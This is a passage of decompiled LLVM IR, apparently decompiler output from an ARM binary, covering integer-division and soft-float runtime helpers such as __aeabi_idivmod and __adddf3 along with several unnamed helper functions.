  %v4_1e584 = udiv i32 %v1_1e584, 16
  %v4_1e588 = udiv i32 %v1_1e588, 16
  br label %dec_label_pc_1e550

dec_label_pc_1e590:                               ; preds = %thread-pre-split12, %bb99
  %v1_1e590 = icmp slt i32 %v2_1e4e8, 0
  br i1 %v1_1e590, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1e590
  %v2_1e594 = sub i32 0, %v1_1e594
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1e59c, %dec_label_pc_1e590, %bb100
  %v1_1e598 = phi i32 [ %v1_1e594, %dec_label_pc_1e590 ], [ %v2_1e594, %bb100 ], [ %v0_1e4e8, %dec_label_pc_1e59c ], [ %v2_1e5a0, %bb101 ], [ %v1_1e5b480, %bb103 ], [ %v2_1e5b0, %bb104 ]
  ret i32 %v1_1e598

dec_label_pc_1e59c:                               ; preds = %thread-pre-split
  br i1 %v1_1e4e4, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1e59c
  %v2_1e5a0 = sub i32 0, %v0_1e4e8
  br label %.thread16

dec_label_pc_1e5a8:                               ; preds = %bb86
  br i1 %v3_1e504, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1e5a8
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1e5a8, %bb102
  %v1_1e5b480 = phi i32 [ %v0_1e4e8, %dec_label_pc_1e5a8 ], [ 0, %bb102 ]
  br i1 %v9_1e504, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1e5ac = ashr i32 %v2_1e4e8, 31
  %v2_1e5b0 = or i32 %v4_1e5ac, 1
  br label %.thread16

dec_label_pc_1e5b8:                               ; preds = %dec_label_pc_1e50c
  %v2_1e5b8 = icmp ugt i32 %v1_1e5bc, 65535
  br i1 %v2_1e5b8, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1e5b8
  %v2_1e5bc = and i32 %v1_1e5bc, 32768
  %v3_1e5bc = icmp eq i32 %v2_1e5bc, 0
  %v4_1e5bc = udiv i32 %v1_1e5bc, 65536
  br i1 %v3_1e5bc, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1e5b8
  %v0_1e5c870 = phi i32 [ %v1_1e5bc, %dec_label_pc_1e5b8 ], [ %v4_1e5bc, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1e5cc = phi i32 [ %v0_1e5c870, %.thread19 ], [ %v4_1e5bc, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1e5c8 = icmp ugt i32 %v1_1e5cc, 255
  br i1 %v2_1e5c8, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1e5cc = and i32 %v1_1e5cc, 128
  %v3_1e5cc = icmp eq i32 %v2_1e5cc, 0
  %v4_1e5cc = udiv i32 %v1_1e5cc, 256
  br i1 %v3_1e5cc, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1e5d0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1e5dc = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1e5d0, %bb108 ]
  %v1_1e5d8 = phi i32 [ %v1_1e5cc, %bb106 ], [ %v4_1e5cc, %bb107 ], [ %v4_1e5cc, %bb108 ]
  %v2_1e5d4 = icmp ugt i32 %v1_1e5d8, 15
  br i1 %v2_1e5d4, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1e5d8 = and i32 %v1_1e5d8, 8
  %v3_1e5d8 = icmp eq i32 %v2_1e5d8, 0
  %v4_1e5d8 = udiv i32 %v1_1e5d8, 16
  br i1 %v3_1e5d8, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1e5dc = add nsw i32 %v1_1e5dc, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1e5e4 = phi i32 [ %v1_1e5dc, %.thread20 ], [ %v1_1e5dc, %bb109 ], [ %v2_1e5dc, %bb110 ]
  %v5_1e5e8 = phi i32 [ %v1_1e5d8, %.thread20 ], [ %v4_1e5d8, %bb109 ], [ %v4_1e5d8, %bb110 ]
  %v2_1e5e0 = icmp ugt i32 %v5_1e5e8, 3
  %v7_1e5e0 = icmp eq i32 %v5_1e5e8, 4
  %v2_1e5e4 = xor i1 %v7_1e5e0, true
  %v3_1e5e4 = and i1 %v2_1e5e0, %v2_1e5e4
  br i1 %v3_1e5e4, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1e5e4 = add nsw i32 %v4_1e5e4, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1e5e8 = phi i32 [ %v4_1e5e4, %.thread21 ], [ %v5_1e5e4, %bb111 ]
  %v2_1e5e8 = xor i1 %v2_1e5e0, true
  %v3_1e5e8 = or i1 %v7_1e5e0, %v2_1e5e8
  br i1 %v3_1e5e8, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1e5e8 = udiv i32 %v5_1e5e8, 2
  %v9_1e5e8 = add i32 %v4_1e5e8, %v8_1e5e8
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1e5f0 = phi i32 [ %v4_1e5e8, %bb112 ], [ %v9_1e5e8, %bb113 ]
  %v1_1e5ec = icmp slt i32 %v2_1e4e8, 0
  %v6_1e5f0 = lshr i32 %v0_1e5f0, %v1_1e5f0
  %v2_1e5f4 = sub i32 0, %v6_1e5f0
  %v2_1e5f4.v6_1e5f0 = select i1 %v1_1e5ec, i32 %v2_1e5f4, i32 %v6_1e5f0
  ret i32 %v2_1e5f4.v6_1e5f0

dec_label_pc_1e5fc:                               ; preds = %entry
  %v0_1e5fc = load i32, i32* @lr, align 4
  %v0_1e600 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1e5fc)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1e5e8, { 1, 0 }
  uselistorder i1 %v7_1e5e0, { 1, 0 }
  uselistorder i32 %v4_1e5d8, { 1, 0 }
  uselistorder i32 %v1_1e5d8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1e5cc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1e5cc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1e5bc, { 1, 0 }
  uselistorder i32 %v0_1e580, { 1, 0 }
  uselistorder i32 %v4_1e574, { 1, 0 }
  uselistorder i32 %v1_1e57c, { 1, 2, 0 }
  uselistorder i32 %v4_1e568, { 1, 0 }
  uselistorder i32 %v1_1e570, { 1, 2, 0 }
  uselistorder i32 %v4_1e55c, { 1, 0 }
  uselistorder i32 %v1_1e564, { 1, 2, 0 }
  uselistorder i32 %v1_1e588, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1e558, { 1, 0 }
  uselistorder i32 %v1_1e584, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1e544, { 1, 0 }
  uselistorder i32 %v3_1e540, { 1, 0 }
  uselistorder i32 %v1_1e540, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1e53c, { 1, 0 }
  uselistorder i32 %v1_1e544, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1e530, { 1, 0 }
  uselistorder i32 %v4_1e52c, { 2, 1, 0 }
  uselistorder i32 %v1_1e530, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1e538.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1e504, { 1, 0 }
  uselistorder i32 %v1_1e5bc, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1e4e8, { 1, 0, 2 }
  uselistorder i32 %v0_1e4e8, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1e590, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1e54c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1e538thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1e610 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1e610
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_1e624 = sub i32 0, %arg1
  %v2_1e624 = sext i32 %v1_1e624 to i64
  %v3_1e628 = bitcast i64 %v2_1e624 to double
  %v9_1e628 = fadd double %v3_1e628, %arg2
  %v10_1e628 = fptrunc double %v9_1e628 to float
  %v11_1e628 = bitcast float %v10_1e628 to i32
  ret i32 %v11_1e628
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1e62c = load i32, i32* @r0, align 4
  ret i32 %v2_1e62c
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1e630 = load i32, i32* @r4, align 4
  store i32 %v3_1e630, i32* %stack_var_-12, align 4
  %v6_1e630 = load i32, i32* @r5, align 4
  %v0_1e634 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e634 = mul i32 %v0_1e634, 2
  store i32 %v2_1e634, i32* %r4.global-to-local, align 4
  %v0_1e638 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e638 = mul i32 %v0_1e638, 2
  store i32 %v2_1e638, i32* %r5.global-to-local, align 4
  %v4_1e63c = icmp eq i32 %v2_1e638, %v2_1e634
  %v1_1e640 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_1e63c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1e640 = load i32, i32* %r3.global-to-local, align 4
  %v5_1e640 = icmp eq i32 %v2_1e640, %v1_1e640
  br i1 %v5_1e640, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1e644 = or i32 %v1_1e640, %v2_1e634
  %v5_1e644 = icmp eq i32 %v3_1e644, 0
  br i1 %v5_1e644, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_1e648 = load i32, i32* %r3.global-to-local, align 4
  %v3_1e648 = or i32 %v2_1e648, %v2_1e638
  %v5_1e648 = icmp eq i32 %v3_1e648, 0
  br i1 %v5_1e648, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1e634.off = add i32 %v2_1e634, 4194303
  %tmp = icmp ult i32 %v2_1e634.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_1e638.off = add i32 %v2_1e638, 4194303
  %tmp18 = icmp ult i32 %v2_1e638.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_1e654 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1e654, i32 ptrtoint (i32* @global_var_1e874.1779 to i32))
  %v0_1e658 = load i32, i32* %r4.global-to-local, align 4
  %v3_1e658 = udiv i32 %v0_1e658, 2097152
  store i32 %v3_1e658, i32* %r4.global-to-local, align 4
  %v1_1e65c = load i32, i32* %r5.global-to-local, align 4
  %v4_1e65c = udiv i32 %v1_1e65c, 2097152
  %v5_1e65c = sub nsw i32 %v4_1e65c, %v3_1e658
  %v5_1e660 = icmp ult i32 %v4_1e65c, %v3_1e658
  br i1 %v5_1e660, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_1e660 = sub nsw i32 0, %v5_1e65c
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_1e660, %bb14 ], [ %v5_1e65c, %.thread3 ]
  %v1_1e6c0 = phi i32 [ %v7_1e660, %bb14 ], [ %v5_1e65c, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1e664 = icmp ugt i32 %v4_1e65c, %v3_1e658
  br i1 %v7_1e664, label %dec_label_pc_1e668, label %dec_label_pc_1e684

dec_label_pc_1e668:                               ; preds = %bb15
  %v2_1e668 = add nsw i32 %v1_1e6c0, %v3_1e658
  store i32 %v2_1e668, i32* %r4.global-to-local, align 4
  %v0_1e66c = load i32, i32* %r1.global-to-local, align 4
  %v1_1e66c = load i32, i32* %r3.global-to-local, align 4
  %v0_1e670 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e670 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1e66c, i32* %r1.global-to-local, align 4
  store i32 %v1_1e670, i32* %r0.global-to-local, align 4
  store i32 %v0_1e66c, i32* %r3.global-to-local, align 4
  store i32 %v0_1e670, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e684

dec_label_pc_1e684:                               ; preds = %bb15, %dec_label_pc_1e668
  %v0_1e6c0 = phi i32 [ %v3_1e658, %bb15 ], [ %v2_1e668, %dec_label_pc_1e668 ]
  %tmp19 = icmp ugt i32 %v1_1e6c0, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_1e684
  %v6_1e688 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1e688, i32* %r4.global-to-local, align 4
  store i32 %v6_1e630, i32* %r5.global-to-local, align 4
  %v15_1e688 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_1e688

bb17:                                             ; preds = %dec_label_pc_1e684
  %v0_1e68c = load i32, i32* %r0.global-to-local, align 4
  %v3_1e68c = icmp sgt i32 %v0_1e68c, -1
  %v4_1e698 = urem i32 %v0_1e68c, 1048576
  %v5_1e698 = or i32 %v4_1e698, 1048576
  store i32 %v5_1e698, i32* %r0.global-to-local, align 4
  br i1 %v3_1e68c, label %dec_label_pc_1e6a8, label %dec_label_pc_1e6a0

dec_label_pc_1e6a0:                               ; preds = %bb17
  %v0_1e6a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e6a0 = sub i32 0, %v0_1e6a0
  store i32 %v1_1e6a0, i32* %r1.global-to-local, align 4
  %v2_1e6a0 = icmp eq i32 %v0_1e6a0, 0
  %v2_1e6a4 = icmp eq i1 %v2_1e6a0, false
  %v5_1e6a4 = sext i1 %v2_1e6a4 to i32
  %v6_1e6a4 = sub nsw i32 %v5_1e6a4, %v5_1e698
  store i32 %v6_1e6a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e6a8

dec_label_pc_1e6a8:                               ; preds = %bb17, %dec_label_pc_1e6a0
  %v0_1e6a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e6a8 = icmp sgt i32 %v0_1e6a8, -1
  %v4_1e6b0 = urem i32 %v0_1e6a8, 1048576
  %v5_1e6b0 = or i32 %v4_1e6b0, 1048576
  store i32 %v5_1e6b0, i32* %r2.global-to-local, align 4
  br i1 %v3_1e6a8, label %dec_label_pc_1e6c0, label %dec_label_pc_1e6b8

dec_label_pc_1e6b8:                               ; preds = %dec_label_pc_1e6a8
  %v0_1e6b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e6b8 = sub i32 0, %v0_1e6b8
  store i32 %v1_1e6b8, i32* %r3.global-to-local, align 4
  %v2_1e6b8 = icmp eq i32 %v0_1e6b8, 0
  %v2_1e6bc = icmp eq i1 %v2_1e6b8, false
  %v5_1e6bc = sext i1 %v2_1e6bc to i32
  %v6_1e6bc = sub nsw i32 %v5_1e6bc, %v5_1e6b0
  store i32 %v6_1e6bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e6c0

dec_label_pc_1e6c0:                               ; preds = %dec_label_pc_1e6a8, %dec_label_pc_1e6b8
  %v4_1e6c0 = icmp eq i32 %v0_1e6c0, %v1_1e6c0
  call void @__pseudo_cond_branch(i1 %v4_1e6c0, i32 ptrtoint (i32* @global_var_1e85c.1780 to i32))
  %v1_1e6c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1e6c4

; uselistorder directives
  uselistorder i32 %v0_1e6a8, { 1, 0 }
  uselistorder i32 %v0_1e68c, { 1, 0 }
  uselistorder i32 %v4_1e65c, { 2, 1, 0 }
  uselistorder i32 %v3_1e658, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_1e640, { 1, 0 }
  uselistorder i32 %v2_1e638, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1e634, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_1e6c0, { 1, 0 }
  uselistorder label %dec_label_pc_1e6a8, { 1, 0 }
  uselistorder label %dec_label_pc_1e684, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1e6c8() local_unnamed_addr {
dec_label_pc_1e6c8:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1e6c8 = load i32, i32* @r4, align 4
  %v1_1e6c8 = add i32 %v0_1e6c8, -1
  store i32 %v1_1e6c8, i32* @r4, align 4
  %v0_1e6cc = load i32, i32* @r5, align 4
  %v1_1e6cc = sub i32 32, %v0_1e6cc
  %v5_1e6d0 = icmp sgt i32 %v0_1e6cc, 32
  br i1 %v5_1e6d0, label %dec_label_pc_1e6ec, label %dec_label_pc_1e6d4

dec_label_pc_1e6d4:                               ; preds = %dec_label_pc_1e6c8
  %v0_1e6d4 = load i32, i32* @r3, align 4
  %v6_1e6d4 = shl i32 %v0_1e6d4, %v1_1e6cc
  store i32 %v6_1e6d4, i32* %ip.global-to-local, align 4
  %v0_1e6d8 = load i32, i32* @r1, align 4
  %v3_1e6d8 = add i32 %v0_1e6cc, -1
  %v4_1e6d8 = shl i32 1, %v3_1e6d8
  %v7_1e6d8 = lshr i32 %v0_1e6d4, %v0_1e6cc
  %v8_1e6d8 = add i32 %v0_1e6d8, %v7_1e6d8
  %v9_1e6d8 = icmp ult i32 %v8_1e6d8, %v0_1e6d8
  %v0_1e6dc = load i32, i32* @r0, align 4
  %v2_1e6dc = zext i1 %v9_1e6d8 to i32
  %v3_1e6dc = add i32 %v2_1e6dc, %v0_1e6dc
  %v1_1e6e0 = load i32, i32* @r2, align 4
  %v7_1e6e0 = shl i32 %v1_1e6e0, %v1_1e6cc
  %v8_1e6e0 = add i32 %v7_1e6e0, %v8_1e6d8
  store i32 %v8_1e6e0, i32* %r1.global-to-local, align 4
  %v5_1e6e4 = and i32 %v1_1e6e0, %v4_1e6d8
  %v6_1e6e4 = icmp ne i32 %v5_1e6e4, 0
  %v7_1e6e4 = ashr i32 %v1_1e6e0, %v0_1e6cc
  %v9_1e6e4 = add i32 %v3_1e6dc, %v7_1e6e4
  %v10_1e6e4 = zext i1 %v6_1e6e4 to i32
  %v11_1e6e4 = add i32 %v10_1e6e4, %v9_1e6e4
  br label %dec_label_pc_1e708

dec_label_pc_1e6ec:                               ; preds = %dec_label_pc_1e6c8
  %v1_1e6ec = add i32 %v0_1e6cc, -32
  %v1_1e6f0 = add i32 %v1_1e6cc, 32
  %v0_1e6f8 = load i32, i32* @r2, align 4
  %v2_1e6f8 = add i32 %v1_1e6cc, 31
  %v3_1e6f8 = lshr i32 -2147483648, %v2_1e6f8
  %v4_1e6f8 = and i32 %v0_1e6f8, %v3_1e6f8
  %v5_1e6f8 = icmp ne i32 %v4_1e6f8, 0
  %v6_1e6f8 = shl i32 %v0_1e6f8, %v1_1e6f0
  %v2_1e6fc = or i32 %v6_1e6f8, 2
  %v2_1e6fc.v6_1e6f8 = select i1 %v5_1e6f8, i32 %v2_1e6fc, i32 %v6_1e6f8
  store i32 %v2_1e6fc.v6_1e6f8, i32* %ip.global-to-local, align 4
  %v0_1e700 = load i32, i32* @r1, align 4
  %v7_1e700 = ashr i32 %v0_1e6f8, %v1_1e6ec
  %v8_1e700 = add i32 %v0_1e700, %v7_1e700
  store i32 %v8_1e700, i32* %r1.global-to-local, align 4
  %v0_1e704 = load i32, i32* @r0, align 4
  %v2_1e704 = and i32 %v0_1e6f8, 1073741824
  %v3_1e704 = icmp ne i32 %v2_1e704, 0
  %v4_1e704 = ashr i32 %v0_1e6f8, 31
  %v6_1e704 = add i32 %v0_1e704, %v4_1e704
  %v7_1e704 = zext i1 %v3_1e704 to i32
  %v8_1e704 = add i32 %v6_1e704, %v7_1e704
  br label %dec_label_pc_1e708

dec_label_pc_1e708:                               ; preds = %dec_label_pc_1e6d4, %dec_label_pc_1e6ec
  %storemerge = phi i32 [ %v11_1e6e4, %dec_label_pc_1e6d4 ], [ %v8_1e704, %dec_label_pc_1e6ec ]
  %v0_1e708 = phi i32 [ %v11_1e6e4, %dec_label_pc_1e6d4 ], [ %v8_1e704, %dec_label_pc_1e6ec ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1e708 = and i32 %v0_1e708, -2147483648
  store i32 %v1_1e708, i32* @r5, align 4
  %v1_1e70c = icmp sgt i32 %v0_1e708, -1
  call void @__pseudo_cond_branch(i1 %v1_1e70c, i32 ptrtoint (i32* @global_var_1e71c.1781 to i32))
  %v0_1e710 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e710 = sub i32 0, %v0_1e710
  store i32 %v1_1e710, i32* %ip.global-to-local, align 4
  %v2_1e710 = icmp eq i32 %v0_1e710, 0
  %v0_1e714 = load i32, i32* %r1.global-to-local, align 4
  %v2_1e714 = icmp eq i1 %v2_1e710, false
  %v5_1e714 = sext i1 %v2_1e714 to i32
  %v6_1e714 = sub i32 %v5_1e714, %v0_1e714
  store i32 %v6_1e714, i32* @r1, align 4
  %v7_1e714 = zext i1 %v2_1e714 to i32
  %v8_1e714 = icmp ne i32 %v6_1e714, %v7_1e714
  %v9_1e714 = icmp ne i32 %v0_1e714, -1
  %v10_1e714 = or i1 %v9_1e714, %v8_1e714
  %v11_1e714 = icmp ne i32 %v0_1e714, 0
  %v12_1e714 = select i1 %v2_1e714, i1 %v10_1e714, i1 %v11_1e714
  %v0_1e718 = load i32, i32* %r0.global-to-local, align 4
  %v5_1e718 = sext i1 %v12_1e714 to i32
  %v6_1e718 = sub i32 %v5_1e718, %v0_1e718
  store i32 %v6_1e718, i32* %r0.global-to-local, align 4
  ret i32 %v6_1e718

; uselistorder directives
  uselistorder i1 %v2_1e714, { 1, 2, 0 }
  uselistorder i32 %v0_1e714, { 1, 2, 0 }
  uselistorder i32 %v8_1e704, { 1, 0 }
  uselistorder i32 %v0_1e6f8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1e6e4, { 1, 0 }
  uselistorder i32 %v1_1e6e0, { 1, 0, 2 }
  uselistorder i32 %v0_1e6d8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1e708, { 1, 0 }
}

define i32 @function_1e71c(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1e71c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1e720 = icmp ult i32 %arg1, 1048574
  br i1 %v3_1e720, label %dec_label_pc_1e760, label %dec_label_pc_1e724

dec_label_pc_1e724:                               ; preds = %dec_label_pc_1e71c
  %v3_1e728 = icmp ult i32 %arg1, 2097150
  br i1 %v3_1e728, label %dec_label_pc_1e748, label %dec_label_pc_1e72c

dec_label_pc_1e72c:                               ; preds = %dec_label_pc_1e724
  %v1_1e72c = urem i32 %arg1, 2
  %v2_1e72c = icmp ne i32 %v1_1e72c, 0
  %v3_1e72c = udiv i32 %arg1, 2
  store i32 %v3_1e72c, i32* %r0.global-to-local, align 4
  %v0_1e730 = load i32, i32* %r1.global-to-local, align 4
  %v3_1e730 = zext i1 %v2_1e72c to i32
  %v6_1e730 = zext i32 %v0_1e730 to i64
  %v7_1e730 = sub i32 33, %v0_1e730
  %v8_1e730 = zext i32 %v7_1e730 to i64
  %v9_1e730 = shl i64 %v6_1e730, %v8_1e730
  %v10_1e730 = sub i32 32, %v0_1e730
  %v11_1e730 = shl i32 %v3_1e730, %v10_1e730
  %v12_1e730 = zext i32 %v11_1e730 to i64
  %v14_1e730 = or i64 %v12_1e730, %v9_1e730
  %v15_1e730 = trunc i64 %v14_1e730 to i32
  %v16_1e730 = add i32 %v0_1e730, -1
  %v17_1e730 = shl i32 1, %v16_1e730
  %v18_1e730 = and i32 %v17_1e730, %v0_1e730
  %v19_1e730 = icmp ne i32 %v18_1e730, 0
  store i32 %v15_1e730, i32* %r1.global-to-local, align 4
  %v0_1e734 = load i32, i32* @ip, align 4
  %v3_1e734 = zext i1 %v19_1e730 to i32
  %v6_1e734 = zext i32 %v0_1e734 to i64
  %v7_1e734 = sub i32 33, %v0_1e734
  %v8_1e734 = zext i32 %v7_1e734 to i64
  %v9_1e734 = shl i64 %v6_1e734, %v8_1e734
  %v10_1e734 = sub i32 32, %v0_1e734
  %v11_1e734 = shl i32 %v3_1e734, %v10_1e734
  %v12_1e734 = zext i32 %v11_1e734 to i64
  %v14_1e734 = or i64 %v12_1e734, %v9_1e734
  %v15_1e734 = trunc i64 %v14_1e734 to i32
  store i32 %v15_1e734, i32* @ip, align 4
  %v0_1e738 = load i32, i32* @r4, align 4
  %v1_1e738 = add i32 %v0_1e738, 1
  store i32 %v1_1e738, i32* @r4, align 4
  %v3_1e73c = mul i32 %v1_1e738, 2097152
  %v2_1e740 = icmp ugt i32 %v3_1e73c, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1e740, i32 ptrtoint (i32* @global_var_1e8d4.1782 to i32))
  br label %dec_label_pc_1e748

dec_label_pc_1e748:                               ; preds = %dec_label_pc_1e760, %dec_label_pc_1e724, %dec_label_pc_1e72c
  %v0_1e748 = load i32, i32* @ip, align 4
  %v2_1e748 = icmp slt i32 %v0_1e748, 0
  %v6_1e748 = icmp eq i32 %v0_1e748, -2147483648
  %v1_1e74c = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1e748, label %bb, label %dec_label_pc_1e748._crit_edge

bb:                                               ; preds = %dec_label_pc_1e748
  %v2_1e74c = urem i32 %v1_1e74c, 2
  %v3_1e74c = icmp ne i32 %v2_1e74c, 0
  br label %dec_label_pc_1e748._crit_edge

dec_label_pc_1e748._crit_edge:                    ; preds = %dec_label_pc_1e748, %bb
  %v1_1e750 = phi i1 [ %v3_1e74c, %bb ], [ %v2_1e748, %dec_label_pc_1e748 ]
  %v2_1e750 = zext i1 %v1_1e750 to i32
  %v3_1e750 = add i32 %v2_1e750, %v1_1e74c
  store i32 %v3_1e750, i32* %r1.global-to-local, align 4
  %v0_1e754 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e754 = load i32, i32* @r4, align 4
  %v2_1e754 = and i32 %v1_1e754, 4096
  %v3_1e754 = icmp ne i32 %v2_1e754, 0
  %v4_1e754 = mul i32 %v1_1e754, 1048576
  %v6_1e754 = add i32 %v4_1e754, %v0_1e754
  %v7_1e754 = zext i1 %v3_1e754 to i32
  %v8_1e754 = add i32 %v7_1e754, %v6_1e754
  %v1_1e758 = load i32, i32* @r5, align 4
  %v2_1e758 = or i32 %v1_1e758, %v8_1e754
  store i32 %v2_1e758, i32* %r0.global-to-local, align 4
  ret i32 %v2_1e758

dec_label_pc_1e760:                               ; preds = %dec_label_pc_1e71c
  %v0_1e760 = load i32, i32* @ip, align 4
  %v1_1e760 = icmp slt i32 %v0_1e760, 0
  %v2_1e760 = mul i32 %v0_1e760, 2
